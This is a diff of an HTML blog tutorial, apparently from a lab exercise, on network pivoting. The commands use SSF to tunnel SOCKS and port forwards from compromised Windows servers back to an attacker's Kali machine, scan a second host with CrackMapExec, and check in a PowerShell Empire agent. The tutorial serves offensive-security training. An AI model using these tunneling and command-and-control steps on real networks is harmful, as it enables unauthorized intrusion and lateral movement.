@@ -43,7 +43,7 @@
                     <div style="text-align: center;"><img src="sdfsdf (1).png" alt="" class="centered"></div><br>
     
     
-                    <p> First we start the ssd server on Kali:</p>
+                    <p> First we start an 'ssf' server on Kali:</p>
                     <pre style="font-size:11px">
     ┌──(mpgn㉿kali)-[~/ssf-linux-x86_64-3.0.0]
     └─$ sudo ./ssfd -p 1337
@@ -59,7 +59,7 @@
     [2021-03-02T08:12:02-05:00] [info] [ssfd] listening on <*:1337>
     [2021-03-02T08:12:02-05:00] [info] [ssfd] running (Ctrl + C to stop)
     </pre>
-                    <p> On Server 1 we use ssf to open a remote socks and connect it to the ssfd server (on kali). We use the option <code>-F port</code> to open a remote socks</p>
+                    <p> On Server 1 we use ssf to open a remote socks and connect it to our ssfd server (on kali). We use the option <code>-F port</code> to open a remote socks.</p>
                     <pre style="font-size:11px">
     C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>.\ssf.exe -F 1080 -p 1337 192.168.133.156
     [2021-02-28T12:37:19-08:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
@@ -79,7 +79,7 @@
     [2021-02-28T12:37:19-08:00] [info] [microservice] [socks]: start server on fiber port 1080
     [2021-02-28T12:37:19-08:00] [info] [client] service <remote-socks> OK</pre>
     
-                    <p> On our Kali a line should appear on the server ssfd:</p>
+                    <p> On our Kali, a line should appear on the server ssfd:</p>
                     <pre style="font-size:11px">
     [2021-03-02T08:12:14-05:00] [info] [microservice] [stream_listener]: forward TCP connections from <127.0.0.1:1080> to 1080</pre>
     
@@ -93,7 +93,7 @@
     # meanwile
     # defaults set to "tor"
     socks5 127.0.0.1 1080 </pre>
-                    <p> And then we can use CrackMapExec to connect to the server 2</p>
+                    <p> And then we can use CrackMapExec to scan to Server 2</p>
                     <pre style="font-size:11px">
     ┌──(mpgn㉿kali)-[~]
     └─$ proxychains crackmapexec smb 192.168.151.102
@@ -113,7 +113,7 @@
     
                     <div style="text-align: center;"><img src="sdfsdf (2).png" alt="" class="centered"></div><br>
     
-    <p>Now let's open a socks between server 2 and our Kali. First we open a ssf server on port 5000 on Server 1:</p>
+    <p>Now let's open a socks between Server 2 and our Kali. First we open a ssf server on port 5000 on Server 1:</p>
     <pre style="font-size:11px">
     C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>.\ssfd.exe -p 5000
     [2021-03-02T02:23:25-08:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
@@ -135,7 +135,7 @@
         Ok.
     </pre>
     
-            <p>Then we need to configure a path to tell ssf on Server 2 to use the port 5000 on server 1 to connect to our kali. It's actually very simple, just add the following code in a file.</p>
+            <p>Then we need to configure a path to tell ssf on Server 2 to use the port 5000 on Server 1 to connect to our Kali since our Kali is only reacheable from Server 1. It's actually very simple, just add the following code in a file.</p>
     <pre style="font-size:11px">
     C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>type config.txt
     {
@@ -192,7 +192,7 @@
     SMB         192.168.152.102 445    MSEDGEWIN10      [*] Windows 10.0 Build 17763 x64 (name:MSEDGEWIN10) (domain:MSEDGEWIN10) (signing:False) (SMBv1:False)
     </pre>
     
-    
+      <p><b>Note</b>: We could have close the first ssf connection made on first step (Server 1 to Kali).</p>
                     <h4>Executing our Empire agent on Server 2</h4>
     
                     <div style="text-align: center;"><img src="sdfsdf (3).png" alt="" class="centered"></div><br>
@@ -231,8 +231,7 @@
         Language         True        powershell        Language of the stager to generate.
     </pre>
                     <p>Before executing our agent we need to kill our previous ssf connection on Server 2 and add some options to enable port forwarding</p>
-    <pre style="font-size:11px">
-    C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>.\ssf.exe -c config.txt -L 4443:192.168.133.156:4443 -p 1338 192.168.133.156 -F 1081
+    <pre style="font-size:11px">C:\Users\harry\Desktop\ssf-win-x86_64-3.0.0\ssf-win-x86_64-3.0.0>.\ssf.exe -c config.txt -L 4443:192.168.133.156:4443 -p 1338 192.168.133.156 -F 1081
     [2021-03-02T06:36:22-08:00] [info] [config] loading file <config.txt>
     [2021-03-02T06:36:22-08:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
     [2021-03-02T06:36:22-08:00] [info] [config] [tls] cert path: <file: ./certs/certificate.crt>
@@ -254,7 +253,7 @@
     [2021-03-02T06:36:22-08:00] [info] [client] service <tcp-forward> OK    
     </pre>
     
-                    <p>Now just run your stager and you should see the agent pop in Empire</p>
+                    <p>Now just run your stager on Server 2 and you should see the agent pop in Empire</p>
     <pre style="font-size:11px">
     [*] Sending POWERSHELL stager (stage 1) to 192.168.133.156                                                                                                   
     [*] New agent D816BHAY checked in
